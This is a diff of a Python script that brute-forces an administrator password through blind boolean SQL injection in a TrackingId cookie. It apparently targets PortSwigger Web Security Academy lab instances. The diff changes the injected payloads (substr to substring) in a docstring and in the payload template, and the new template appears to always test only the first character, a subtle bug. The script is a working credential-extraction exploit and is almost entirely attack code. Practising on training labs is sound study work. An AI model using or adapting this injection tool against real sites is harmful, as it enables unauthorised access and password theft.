@@ -4,7 +4,8 @@ import argparse
 from colorama import Fore, Style
 
 '''
-    ' and (select substr(password, 1, 1) from users where username='administrator')='§a§'-- -
+    ' and (select substring(password, 1, 1) from users where username='administrator')='§a§'-- -
+    ' and substring((select password FROM users where username='administrator'), 1, 1)='a'-- -
 https://0a7a00690388c8a082c7ddf300dc000e.web-security-academy.net
     /filter?category=Food+%26+Drink
 
@@ -29,7 +30,7 @@ class BruteForce:
         self.__grep_match = grep_match
         self.__cookies = {}
         self.__session = requests.Session()
-        self.__payload_template = "' and (select substr(password, %d, 1) from users where username='administrator')='%s'-- -"
+        self.__payload_template = "' and substring((select password FROM users where username='administrator'), 1, 1)='%s'-- -"
         self.__no_letter = 1
         self.__letter = 65
         self.__amount = amount
@@ -45,7 +46,7 @@ class BruteForce:
         return self.__session.cookies.get_dict()[self.__cookie]
 
     def configure_payload(self):
-        return self.__payload_template % (self.__no_letter, chr(self.__letter))
+        return self.__payload_template % (chr(self.__letter))
 
     def make_request(self):
         self.__cookies[self.__cookie] += self.configure_payload()
@@ -90,7 +91,7 @@ if __name__ == '__main__':
     # parser = argparse.ArgumentParser(description='SQLi brute force script')
     # # parser.add_argument('-')
     # args = parser.parse_args()
-    bf = BruteForce('https://0ad000c5033afb328000f42900620055.web-security-academy.net', 'TrackingId', 'Welcome back',
+    bf = BruteForce('https://0a3600e503e17cb1827da18f008f00b3.web-security-academy.net', 'TrackingId', 'Welcome back',
                     20)
     # print(bf.get_cookies())
     # bf.print_pt()
